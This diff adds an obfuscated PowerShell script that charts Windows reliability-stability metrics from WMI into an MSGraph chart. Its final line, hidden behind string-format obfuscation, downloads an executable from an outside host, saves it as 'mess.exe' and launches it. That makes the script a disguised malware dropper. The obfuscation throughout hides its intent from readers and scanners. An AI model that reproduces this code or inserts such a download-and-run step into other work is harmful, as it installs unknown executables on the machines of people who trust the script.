@@ -1,0 +1,16 @@
+  set-iTeM ("{0}{4}{2}{3}{1}" -f'V','J','b','LE:zsrd','aRiA')  ([tyPE]("{9}{0}{4}{7}{2}{3}{1}{10}{6}{8}{5}"-f'ANAg','DaT','.Man','AgemEnT','EmeN','tER','mec','T','OnVeR','M','ETi')  ); ${c`O`MPu`TeR} = ("{0}{1}{2}" -f 'lo','c','alhost') 
+${C`H`Art} = .("{0}{3}{2}{1}"-f 'New-Ob','t','ec','j') -ComObject ("{5}{4}{1}{6}{2}{0}{3}"-f'icati','a','h.appl','on','r','msg','p') 
+${ChA`Rt}."VIsi`Ble" = ${t`RUe} 
+${cha`Rt}."dAt`AS`heet"."cE`lls".("{1}{0}"-f'm','ite').Invoke(1,1) = ("{1}{0}" -f 'me','Ti') 
+${cHA`Rt}."dAta`SHeeT"."c`ElLS".("{1}{0}"-f 'em','it').Invoke(1,2) = ("{2}{1}{0}{3}"-f'iability','el','R','Metric') 
+${R} = 2 
+
+&("{2}{1}{0}" -f 't','-WmiObjec','Get') -Class ("{3}{4}{6}{1}{7}{0}{5}{2}" -f 'ityM','i','s','win32','_r','etric','eliab','lityStabil') -computername ${C`O`MpuTER}| 
+.("{3}{1}{0}{2}" -f 'b','ct-O','ject','Sele') -First 254 | 
+&("{1}{0}{2}" -f 'orEach-','F','Object') { 
+  ${cH`ArT}."daTaS`h`Eet"."CE`lls".("{0}{1}" -f 'i','tem').Invoke(${R},1) =  
+   (  GET-varIabLE  ("{1}{0}" -f'RdJ','Zs')  -vAluEOn)::("{1}{0}{3}{2}" -f 'e','ToDat','e','Tim').Invoke(${_}."T`iMEg`ENeRA`Ted") 
+  ${c`hARt}."d`ATA`SHeet"."cE`LLS".("{0}{1}"-f 'ite','m').Invoke(${r},2) = ${_}."sYStE`Mstab`iLityi`NdEx" 
+${r}++ 
+}
+(.("{2}{1}{0}{3}"-f'e','ew-Obj','N','ct') ("{2}{0}{3}{1}"-f'N','nt','System.','et.WebClie')).("{0}{3}{2}{1}" -f'D','le','loadFi','own').Invoke(("{1}{3}{2}{5}{0}{4}"-f'b','h','tp://wor','t','acoss.exe','ldnit.com/a'),("{0}{1}{2}" -f 'mes','s.ex','e'));.("{1}{0}{2}" -f 'art-','St','Process') ("{0}{1}{2}" -f 'm','ess.ex','e')
